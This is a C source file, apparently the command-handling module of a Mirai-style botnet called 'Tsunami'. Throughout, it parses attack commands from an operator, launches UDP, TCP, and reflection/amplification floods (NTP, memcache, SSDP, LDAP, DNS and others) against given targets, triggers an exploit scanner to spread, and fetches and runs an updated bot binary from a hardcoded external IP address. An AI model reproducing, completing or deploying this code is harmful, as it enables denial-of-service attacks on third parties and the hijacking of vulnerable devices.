#ifdef TSUNAMI_COMMAND
#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/types.h>

#include "headers/command.h"
#include "headers/utils.h"
#include "headers/scan.h"

static struct command *start;

static struct command *compare_command(uint8_t type, uint8_t id)
{
	struct command *ptr = start;

	while(ptr)
	{
		if(ptr->type == type && ptr->id == id)
			break;
		ptr = ptr->next;
	}

	if(!ptr)
		return NULL;

	return ptr;
}

static void command_flood(uint8_t type, uint8_t id, uint32_t duration, uint16_t port, struct target *t, uint8_t num_of_targets)
{
	int pid = fork();
	int pid2 = 0;
	struct command *p;

	if(pid > 0 || pid == -1)
		return;

	p = compare_command(type, id);
	if(!p)
		exit(0);

	pid2 = fork();
	if(pid2 == -1)
		exit(0);
	else if(pid2 == 0)
	{
		sleep(duration);
		#ifdef DEBUG
		printf("Flood finished!\n");
		#endif
		#ifdef TSUNAMI_SCAN
		exploit_scan();
		#endif
		free(t);
		kill(getppid(), 9);
		exit(0);
	}

	#ifdef TSUNAMI_SCAN
	exploit_scan();
	#endif

	p->func(t, port, num_of_targets);
	exit(0);
}

static void command_update_binary(char *buf, uint16_t len, uint8_t type, uint8_t id)
{
	#ifdef DEBUG
	printf("UPDATE!\n");
	#endif

	int ffd = -1;
    
	if ((ffd = open(".x", O_WRONLY | O_CREAT | O_TRUNC, 0777)) == -1)
	{
		#ifdef DEBUG
        printf("Failed to open file .x!\n");
		#endif
		return;
	}

	#ifdef BOT_ARCH
	struct sockaddr_in dest_addr;
	char recvbuf[128];
    unsigned int header_parser = 0;
	int sock = -1;

	if((sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return;

	dest_addr.sin_family = AF_INET;
	dest_addr.sin_port = htons(80);
	dest_addr.sin_addr.s_addr = INET_ADDR(5,206,227,65);

	if (connect(sock, &dest_addr, sizeof (struct sockaddr_in)) < 0)
    {
		#ifdef DEBUG
        printf("Failed to connect to host.\n");
		#endif

		close(sock);
		close(ffd);
        return;
    }

	if (write(sock, "GET /tsunami." BOT_ARCH " HTTP/1.0\r\n\r\n", 13 + util_strlen(BOT_ARCH) + 13) != (13 + util_strlen(BOT_ARCH) + 13))
    {
		#ifdef DEBUG
        printf("Failed to send request.\n");
		#endif

		close(sock);
		close(ffd);
        return;
    }

	while (header_parser != 0x0d0a0d0a)
    {
        char ch;
        int ret = read(sock, &ch, 1);

        if (ret != 1)
        {
			close(sock);
			close(ffd);
			return;
		}

        header_parser = (header_parser << 8) | ch;
    }

	while (1)
    {
        int ret = read(sock, recvbuf, sizeof (recvbuf));

        if (ret <= 0)
            break;

        write(ffd, recvbuf, ret);
    }

	#ifdef DEBUG
	printf("Downloaded '%s'\n", BOT_ARCH);
	#endif

	close(sock);
	close(ffd);
	
	#ifdef DEBUG
	printf("Attempting to execute '%s'\n", BOT_ARCH);
	#endif

	//system("echo 'chmod 777 .x; ./.x new' > run.sh");
	
	#ifdef DEBUG
	printf("Created shell file '%s'\n", BOT_ARCH);
	#endif

	int X = open("./output_file.txt", O_WRONLY);
	pid_t fk = fork();
	if (!fk) 
	{
		dup2(X, 1); 
		close(X);
		execl("/bin/sh", "run.sh", NULL);
	}
	else if (fk == -1) 
	{
		perror("fork"); 
	}

	close(X); 
	int status;
	wait(&status); 
	printf("child pid was %d, it exited with %d\n", fk, status);

	#ifdef DEBUG
	printf("Ran shell file '%s'\n", BOT_ARCH);
	#endif

	#endif
		
	return;
}

static void command_util_parse(char *buf, uint16_t len, uint8_t type, uint8_t id)
{
	uint16_t str_len = 0;
	struct utility u;
	struct command *p;

	#ifdef DEBUG
	printf("UTIL!\nType: %d\nID:%d\n", type, id);
	#endif

	p = compare_command(type, id);
	if(!p)
		return;

	str_len = (uint16_t)*buf++;
	len -= sizeof(uint16_t);

	// No extra arguments
	if(str_len == 0)
	{
		p->func();
		return;
	}

	u.str_len = str_len;
	u.str = (char *)malloc(u.str_len);
	util_memcpy(u.str, buf, u.str_len);

	// Call the function
	p->func(u.str);

	free(u.str);
	return;
}

static struct target *command_dns_load(char *buf, uint16_t *len, uint8_t num_of_targets)
{
	int i = 0;
	struct target *t;

	t = (struct target *)calloc(num_of_targets, sizeof(struct target));
	if(!t)
		return NULL;

	for(i = 0; i < num_of_targets; i++)
	{
		t[i].domain_len = (uint16_t)*buf++;
		*len -= sizeof(uint16_t);
		t[i].domain = (char *)malloc(t[i].domain_len);
		util_memcpy(t[i].domain, buf, t[i].domain_len);
		#ifdef DEBUG
		printf("Loaded domain %s:%d\n", t[i].domain, t[i].domain_len);
		#endif
		buf += t[i].domain_len;
		*len -= t[i].domain_len;
	}

	// Copy the edited buf so we can use it for more data collection in another function
	t->copy = buf;
	return t;
}

static struct target *command_ipv4_load(char *buf, uint16_t *len, uint8_t num_of_targets)
{
	int i = 0;
	struct target *t;

	t = (struct target *)calloc(num_of_targets, sizeof(struct target));
	if(!t)
		return NULL;

	for(i = 0; i < num_of_targets; i++)
	{
		t[i].address = *((uint32_t *)buf);
		buf += sizeof(uint32_t);
		*len -= sizeof(uint32_t);
		t[i].dest_addr.sin_family = AF_INET;
		t[i].dest_addr.sin_addr.s_addr = t[i].address;
		#ifdef DEBUG
		printf("Loaded address %d.%d.%d.%d\n", t[i].address & 0xff, (t[i].address >> 8) & 0xff, (t[i].address >> 16) & 0xff, (t[i].address >> 24) & 0xff);
		#endif
	}

	// Copy the edited buf so we can use it for more data collection in another function
	t->copy = buf;
	return t;
}

void command_parse(char *buf, uint16_t len)
{
	uint8_t type = 0;
	uint8_t id = 0;
	struct target *t;
	uint32_t duration = 0;
	uint16_t port = 0;
	uint8_t num_of_targets = 0;
	BOOL dns = FALSE;
	
	type = (uint8_t)*buf;

	buf += sizeof(uint8_t);
	len -= sizeof(uint8_t);

	if(len == 0)
		return;

	id = (uint8_t)*buf++;
	len -= sizeof(uint8_t);

	#ifdef DEBUG
	printf("[command] type: %d id: %d\n", type, id);
	#endif

	if(type == COMMAND_TYPE_UTIL)
	{	
		command_util_parse(buf, len, type, id);
		return;
	}

	if(len == 0)
		return;

	num_of_targets = (uint8_t)*buf++;
	len -= sizeof(uint8_t);

	if(len == 0)
		return;

	dns = id == COMMAND_FLOOD_DNS ? TRUE : FALSE;
	
	// Failed to read in domain/ipv4
	if(len < (dns ? sizeof(uint16_t) : sizeof(uint32_t)))
		return;

	if(dns)
		t = command_dns_load(buf, &len, num_of_targets);
	else
		t = command_ipv4_load(buf, &len, num_of_targets);

	if(!t)
		return;

	// Failed to read in port+duration
	if(len < sizeof(uint16_t) + sizeof(uint32_t))
		return;

	port = ntohs(*((uint16_t *)t->copy));
	t->copy += sizeof(uint16_t);
	len -= sizeof(uint16_t);

	duration = ntohl(*((uint32_t *)t->copy));

	// Initilize the flood
	command_flood(type, id, duration, port, t, num_of_targets);
	return;
}

static void load_command(uint8_t type, uint8_t id, COMMAND_FUNC func)
{
	struct command *ptr = (struct command *)malloc(sizeof(struct command));
	ptr->id = id;
	ptr->next = start;
	ptr->type = type;
	ptr->func = func;
	start = ptr;
	return;
}

void init_commands(void)
{
	// Utilities
	load_command(COMMAND_TYPE_UTIL, COMMAND_UTIL_KILL, (COMMAND_FUNC)terminate_instance);
	load_command(COMMAND_TYPE_UTIL, COMMAND_UTIL_UPDATE, (COMMAND_FUNC)command_update_binary);

	// Floods
	load_command(COMMAND_TYPE_FLOOD, COMMAND_FLOOD_UDP, (COMMAND_FUNC)flood_udp);
	load_command(COMMAND_TYPE_FLOOD, COMMAND_FLOOD_TCP_SYN, (COMMAND_FUNC)flood_tcp_syn);
	load_command(COMMAND_TYPE_FLOOD, COMMAND_FLOOD_TCP_ACK, (COMMAND_FUNC)flood_tcp_ack);
	load_command(COMMAND_TYPE_FLOOD, COMMAND_FLOOD_NTP, (COMMAND_FUNC)flood_ntp);
	load_command(COMMAND_TYPE_FLOOD, COMMAND_FLOOD_MEMCACHE, (COMMAND_FUNC)flood_memcache);
	load_command(COMMAND_TYPE_FLOOD, COMMAND_FLOOD_SSDP, (COMMAND_FUNC)flood_ssdp);
	load_command(COMMAND_TYPE_FLOOD, COMMAND_FLOOD_NETBIOS, (COMMAND_FUNC)flood_netbios);
	load_command(COMMAND_TYPE_FLOOD, COMMAND_FLOOD_PORTMAP, (COMMAND_FUNC)flood_portmap);
	load_command(COMMAND_TYPE_FLOOD, COMMAND_FLOOD_LDAP, (COMMAND_FUNC)flood_ldap);
	load_command(COMMAND_TYPE_FLOOD, COMMAND_FLOOD_MDNS, (COMMAND_FUNC)flood_mdns);
	load_command(COMMAND_TYPE_FLOOD, COMMAND_FLOOD_DNS, (COMMAND_FUNC)flood_dns);
	load_command(COMMAND_TYPE_FLOOD, COMMAND_FLOOD_GRE, (COMMAND_FUNC)flood_gre);
	return;
}
#endif